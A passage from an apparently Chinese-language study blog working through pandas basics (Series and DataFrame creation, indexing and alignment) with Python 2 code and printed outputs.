class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"crossing_times.mean()-------"</span></span><br><span class="line"><span class="keyword">print</span> crossing_times.mean()</span><br><span class="line"></span><br><span class="line"><span class="comment">#其他分布方式得到漫步数据</span></span><br><span class="line">steps = np.random.normal(loc = <span class="number">0</span>, scale = <span class="number">0.25</span>, size = (nwalks,nsteps))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">walks.max()----------</span><br><span class="line">119</span><br><span class="line">walks.min()----------</span><br><span class="line">-107</span><br><span class="line">到达30或-30的数量</span><br><span class="line">3329</span><br><span class="line">crossing_times.mean()-------</span><br><span class="line">497.677080204</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h1 id="Chapter-5-pandas入门"><a href="#Chapter-5-pandas入门" class="headerlink" title="Chapter 5: pandas入门"></a>Chapter 5: pandas入门</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h3><ol>
<li><p>类似于一维数组的对象，由一组数组和一组与之对应的数据标签（即索引）组成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">obj = pd.Series([<span class="number">4</span>,<span class="number">7</span>,<span class="number">-5</span>,<span class="number">3</span>])</span><br><span class="line"><span class="keyword">print</span> obj</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0    4</span><br><span class="line">1    7</span><br><span class="line">2   -5</span><br><span class="line">3    3</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
<li><p>values 和 index属性</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj.values</span><br><span class="line"><span class="keyword">print</span> obj.index</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ 4  7 -5  3]</span><br><span class="line">RangeIndex(start=0, stop=4, step=1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>自定义index</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj2 = pd.Series([<span class="number">4</span>,<span class="number">7</span>,<span class="number">-5</span>,<span class="number">3</span>], index = [<span class="string">'d'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>])</span><br><span class="line"><span class="keyword">print</span> obj2</span><br><span class="line"><span class="keyword">print</span> obj2.index</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d    4</span><br><span class="line">b    7</span><br><span class="line">a   -5</span><br><span class="line">c    3</span><br><span class="line">dtype: int64</span><br><span class="line">Index([u&apos;d&apos;, u&apos;b&apos;, u&apos;a&apos;, u&apos;c&apos;], dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过索引来选取Series中的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj2[<span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line">obj2[<span class="string">'d'</span>] = <span class="number">6</span></span><br><span class="line"><span class="keyword">print</span> obj2[[<span class="string">'c'</span>,<span class="string">'a'</span>,<span class="string">'d'</span>]]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-5</span><br><span class="line">c    3</span><br><span class="line">a   -5</span><br><span class="line">d    6</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
<p><strong>**</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj2[obj2 &gt; <span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> obj2 * <span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> np.exp(obj2)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">d    6</span><br><span class="line">b    7</span><br><span class="line">c    3</span><br><span class="line">dtype: int64</span><br><span class="line">d    12</span><br><span class="line">b    14</span><br><span class="line">a   -10</span><br><span class="line">c     6</span><br><span class="line">dtype: int64</span><br><span class="line">d     403.428793</span><br><span class="line">b    1096.633158</span><br><span class="line">a       0.006738</span><br><span class="line">c      20.085537</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过字典直接建立Series</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sdata = &#123;<span class="string">"Ohio"</span> : <span class="number">35000</span>, <span class="string">'Texas'</span>: <span class="number">71000</span>, <span class="string">"Oregon"</span>: <span class="number">16000</span>, <span class="string">"Utah"</span>: <span class="number">5000</span>&#125;</span><br><span class="line">obj3 = pd.Series(sdata)</span><br><span class="line"><span class="keyword">print</span> obj3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ohio      35000</span><br><span class="line">Oregon    16000</span><br><span class="line">Texas     71000</span><br><span class="line">Utah       5000</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
<li><p>传入字典，并有index参数，则用index来排序,从字典中寻找index对应的值，没有的话，NaN来代替</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">states = [<span class="string">'California'</span>, <span class="string">"Ohio"</span>, <span class="string">'Oregon'</span>,<span class="string">'Texas'</span>]</span><br><span class="line">obj4 = pd.Series(sdata,index = states)</span><br><span class="line"><span class="keyword">print</span> obj4</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">California        NaN</span><br><span class="line">Ohio          35000.0</span><br><span class="line">Oregon        16000.0</span><br><span class="line">Texas         71000.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>pd.isnull, pd.notnull 寻找缺失数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> pd.isnull(obj4)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> pd.notnull(obj4)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">California     True</span><br><span class="line">Ohio          False</span><br><span class="line">Oregon        False</span><br><span class="line">Texas         False</span><br><span class="line">dtype: bool</span><br><span class="line"></span><br><span class="line">California    False</span><br><span class="line">Ohio           True</span><br><span class="line">Oregon         True</span><br><span class="line">Texas          True</span><br><span class="line">dtype: bool</span><br></pre></td></tr></table></figure>
</li>
<li><p>Series 算术运算中会自动对齐不同的数据 <span class="tag" tag-name="注意点"><span class="smallcaps">注意点</span>&lt;/span&gt;</span></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj3</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj4</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> obj3 + obj4</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Ohio      35000</span><br><span class="line">Oregon    16000</span><br><span class="line">Texas     71000</span><br><span class="line">Utah       5000</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">California        NaN</span><br><span class="line">Ohio          35000.0</span><br><span class="line">Oregon        16000.0</span><br><span class="line">Texas         71000.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">California         NaN</span><br><span class="line">Ohio           70000.0</span><br><span class="line">Oregon         32000.0</span><br><span class="line">Texas         142000.0</span><br><span class="line">Utah               NaN</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>Series 本身 与 index(索引） 有name属性</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj4.name = <span class="string">'population'</span></span><br><span class="line">obj4.index.name = <span class="string">"state"</span></span><br><span class="line"><span class="keyword">print</span> obj4</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">state</span><br><span class="line">California        NaN</span><br><span class="line">Ohio          35000.0</span><br><span class="line">Oregon        16000.0</span><br><span class="line">Texas         71000.0</span><br><span class="line">Name: population, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 Series的索引</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> obj</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">obj.index = [<span class="string">'Bob'</span>, <span class="string">"Steve"</span>, <span class="string">'Jeff'</span>, <span class="string">"Ryan"</span>]</span><br><span class="line"><span class="keyword">print</span> obj</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0    4</span><br><span class="line">1    7</span><br><span class="line">2   -5</span><br><span class="line">3    3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">Bob      4</span><br><span class="line">Steve    7</span><br><span class="line">Jeff    -5</span><br><span class="line">Ryan     3</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><ol>
<li><p>创建DataFrame</p>
<ol>
<li><p>简单例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = &#123;<span class="string">"state"</span>: [<span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>,<span class="string">'Nevada'</span>,<span class="string">'Nevada'</span>],</span><br><span class="line">        <span class="string">'Year'</span>:[<span class="number">2000</span>,<span class="number">2001</span>,<span class="number">2002</span>,<span class="number">2001</span>,<span class="number">2002</span>],</span><br><span class="line">        <span class="string">"pop"</span>:[<span class="number">1.5</span>,<span class="number">1.7</span>,<span class="number">3.6</span>, <span class="number">2.4</span>, <span class="number">2.9</span>]&#125;</span><br><span class="line"></span><br><span class="line">frame = pd.DataFrame(data)</span><br><span class="line"><span class="keyword">print</span> frame</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   Year  pop   state</span><br><span class="line">0  2000  1.5    Ohio</span><br><span class="line">1  2001  1.7    Ohio</span><br><span class="line">2  2002  3.6    Ohio</span><br><span class="line">3  2001  2.4  Nevada</span><br><span class="line">4  2002  2.9  Nevada</span><br></pre></td></tr></table></figure>
</li>
<li><p>指定列序号，排序列顺序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d1 = pd.DataFrame(data,columns = [<span class="string">'year'</span>,<span class="string">'state'</span>,<span class="string">'pop'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> d1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  year   state  pop</span><br><span class="line">0  NaN    Ohio  1.5</span><br><span class="line">1  NaN    Ohio  1.7</span><br><span class="line">2  NaN    Ohio  3.6</span><br><span class="line">3  NaN  Nevada  2.4</span><br><span class="line">4  NaN  Nevada  2.9</span><br></pre></td></tr></table></figure>
</li>
<li><p>传入的列在数据中找不到时，会产生NA值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frame2 = pd.DataFrame(data,columns = [<span class="string">"year"</span>,<span class="string">'state'</span>,<span class="string">'pop'</span>,<span class="string">'debt'</span>],</span><br><span class="line">                      index = [<span class="string">'one'</span>,<span class="string">'two'</span>,<span class="string">'three'</span>,<span class="string">'four'</span>,<span class="string">'five'</span>])</span><br><span class="line"><span class="keyword">print</span> frame2</span><br><span class="line"><span class="keyword">print</span> frame2.columns</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      year   state  pop debt</span><br><span class="line">one    NaN    Ohio  1.5  NaN</span><br><span class="line">two    NaN    Ohio  1.7  NaN</span><br><span class="line">three  NaN    Ohio  3.6  NaN</span><br><span class="line">four   NaN  Nevada  2.4  NaN</span><br><span class="line">five   NaN  Nevada  2.9  NaN</span><br><span class="line">Index([u&apos;year&apos;, u&apos;state&apos;, u&apos;pop&apos;, u&apos;debt&apos;], dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>用字典或者属性的方式来获得DataFrame的列（Series)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> frame2[<span class="string">'state'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> frame2.year</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">one        Ohio</span><br><span class="line">two        Ohio</span><br><span class="line">three      Ohio</span><br><span class="line">four     Nevada</span><br><span class="line">five     Nevada</span><br><span class="line">Name: state, dtype: object</span><br><span class="line"></span><br><span class="line">one      NaN</span><br><span class="line">two      NaN</span><br><span class="line">three    NaN</span><br><span class="line">four     NaN</span><br><span class="line">five     NaN</span><br><span class="line">Name: year, dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>获得DataFrame的行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> frame2.ix[<span class="string">'three'</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">year      NaN</span><br><span class="line">state    Ohio</span><br><span class="line">pop       3.6</span><br><span class="line">debe      NaN</span><br><span class="line">Name: three, dtype: object</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改列数值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frame2.debt = <span class="number">16.5</span></span><br><span class="line"><span class="keyword">print</span> frame2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">frame2[<span class="string">'debt'</span>] = np.arange(<span class="number">5.</span>)</span><br><span class="line"><span class="keyword">print</span> frame2</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">      year   state  pop  debt</span><br><span class="line">one    NaN    Ohio  1.5  16.5</span><br><span class="line">two    NaN    Ohio  1.7  16.5</span><br><span class="line">three  NaN    Ohio  3.6  16.5</span><br><span class="line">four   NaN  Nevada  2.4  16.5</span><br><span class="line">five   NaN  Nevada  2.9  16.5</span><br><span class="line"></span><br><span class="line">      year   state  pop  debt</span><br><span class="line">one    NaN    Ohio  1.5   0.0</span><br><span class="line">two    NaN    Ohio  1.7   1.0</span><br><span class="line">three  NaN    Ohio  3.6   2.0</span><br><span class="line">four   NaN  Nevada  2.4   3.0</span><br><span class="line">five   NaN  Nevada  2.9   4.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>将列表或者数组赋值给列</p>
<ol>
<li><p>空位会补上缺失值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">val = pd.Series([<span class="number">-1.2</span>, <span class="number">-1.5</span>, <span class="number">-1.7</span>], index = [<span class="string">'two'</span>,<span class="string">'four'</span>,<span class="string">'five'</span>])</span><br><span class="line">frame2.debt = val</span><br><span class="line"><span class="keyword">print</span> frame2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment"># index没有的，不会赋值上去</span></span><br><span class="line">val = pd.Series([<span class="number">-1.2</span>, <span class="number">-1.5</span>, <span class="number">-1.7</span>], index = [<span class="string">'two'</span>,<span class="string">'four'</span>,<span class="string">'six'</span>])</span><br><span class="line">frame2.debt = val</span><br><span class="line"><span class="keyword">print</span>  frame2</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">      year   state  pop  debt</span><br><span class="line">one    NaN    Ohio  1.5   NaN</span><br><span class="line">two    NaN    Ohio  1.7  -1.2</span><br><span class="line">three  NaN    Ohio  3.6   NaN</span><br><span class="line">four   NaN  Nevada  2.4  -1.5</span><br><span class="line">five   NaN  Nevada  2.9  -1.7</span><br><span class="line"></span><br><span class="line">      year   state  pop  debt</span><br><span class="line">one    NaN    Ohio  1.5   NaN</span><br><span class="line">two    NaN    Ohio  1.7  -1.2</span><br><span class="line">three  NaN    Ohio  3.6   NaN</span><br><span class="line">four   NaN  Nevada  2.4  -1.5</span><br><span class="line">five   NaN  Nevada  2.9   NaN</span><br></pre></td></tr></table></figure>
</li>
<li><p>不存在列赋值会创造新的列，可用del关键字删除列</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frame2.eastern = frame2.state == <span class="string">"Ohio"</span></span><br><span class="line"><span class="keyword">print</span> frame2</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> frame2.eastern</span><br><span class="line"><span class="keyword">print</span> frame2.columns</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      year   state  pop  debt</span><br><span class="line">one    NaN    Ohio  1.5   NaN</span><br><span class="line">two    NaN    Ohio  1.7  -1.2</span><br><span class="line">three  NaN    Ohio  3.6   NaN</span><br><span class="line">four   NaN  Nevada  2.4  -1.5</span><br><span class="line">five   NaN  Nevada  2.9   NaN</span><br><span class="line">Index([u&apos;year&apos;, u&apos;state&apos;, u&apos;pop&apos;, u&apos;debt&apos;], dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>嵌套字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop = &#123;<span class="string">'Nevada'</span>: &#123;<span class="number">2001</span>: <span class="number">2.4</span>, <span class="number">2002</span>: <span class="number">2.9</span>&#125;,</span><br><span class="line">       <span class="string">"Ohio"</span>: &#123;<span class="number">2000</span>:<span class="number">1.5</span>, <span class="number">2001</span>:<span class="number">1.7</span>, <span class="number">2002</span>: <span class="number">3.6</span>&#125;&#125;</span><br><span class="line">frame3 = pd.DataFrame(pop)</span><br><span class="line"><span class="keyword">print</span> frame3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      Nevada  Ohio</span><br><span class="line">2000     NaN   1.5</span><br><span class="line">2001     2.4   1.7</span><br><span class="line">2002     2.9   3.6</span><br></pre></td></tr></table></figure>
<ol>
<li><p>转置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> frame3.T</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        2000  2001  2002</span><br><span class="line">Nevada   NaN   2.4   2.9</span><br><span class="line">Ohio     1.5   1.7   3.6</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>内层字典的键会被合并，排序以形成最终的索引，如果现实指定索引，则不会</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> pd.DataFrame(pop, index = [<span class="number">2002</span>,<span class="number">2003</span>,<span class="number">2001</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      Nevada  Ohio</span><br><span class="line">2002     2.9   3.6</span><br><span class="line">2003     NaN   NaN</span><br><span class="line">2001     2.4   1.7</span><br></pre></td></tr></table></figure>
</li>
<li><p>由Series组成的字典也是一样用法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pdata = &#123;<span class="string">'Ohio'</span>: frame3[<span class="string">'Ohio'</span>][:<span class="number">-1</span>],</span><br><span class="line">         <span class="string">'Nevada'</span>: frame3[<span class="string">'Nevada'</span>][:<span class="number">2</span>]&#125;</span><br><span class="line"><span class="keyword">print</span> pdata</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> pd.DataFrame(pdata)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;Ohio&apos;: 2000    1.5</span><br><span class="line">2001    1.7</span><br><span class="line">Name: Ohio, dtype: float64, &apos;Nevada&apos;: 2000    NaN</span><br><span class="line">2001    2.4</span><br><span class="line">Name: Nevada, dtype: float64&#125;</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">      Nevada  Ohio</span><br><span class="line">2000     NaN   1.5</span><br><span class="line">2001     2.4   1.7</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以输入给DataFrame的数据</p>
<p>|         类型                         |   描述                                                                       |<br>|———————————————|—————————————————————————————————————|<br>| 二维ndarray                  | 数据矩阵，还可以传入行标和列标                                           |<br>| 由数组、列表或元组组成的字典 | 每个序列会变成DF的一列，所有序列的长度必须相同                           |<br>| NumPy的结构化/记录数组       | 类似于“有数组组成的字典”                                                 |<br>| 由series组成的字典           | 每一个Serire会变成一列。如没遇显示指定索引，各索引会被整合成结果的行索引 |<br>| 由字典组成的字典             | 各内层字典会成一列。键会被合并成结果的行索引                             |<br>| 字典或Series的列表           | 各项会成DF的一行，字典键或Series索引的并集将成为DF的列表                 |<br>| 由列表或元组组成的列表       | 类似于“二维ndarray”                                                      |<br>| 另一个DF                     | 该DF的索引将会被沿用，除非显示指定其他索引                               |<br>| NumPy的MaskedArray           | 类似于“二维ndarray”，只是掩码值在结果的DF将会变成NA/缺失值               |<br>|                              |                                                                          |</p>
<ol>
<li><p>如果设置了index和columns的name属性，这些信息也会被显示出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frame3.index.name = <span class="string">"year"</span></span><br><span class="line">frame3.columns.name = <span class="string">"state"</span></span><br><span class="line"><span class="keyword">print</span> frame3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">state  Nevada  Ohio</span><br><span class="line">year</span><br><span class="line">2000      NaN   1.5</span><br><span class="line">2001      2.4   1.7</span><br><span class="line">2002      2.9   3.6</span><br></pre></td></tr></table></figure>
</li>
<li><p>values属性会以二维ndarray形式返回DF的数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> frame3.values</span><br></pre></td></tr></table></figure>
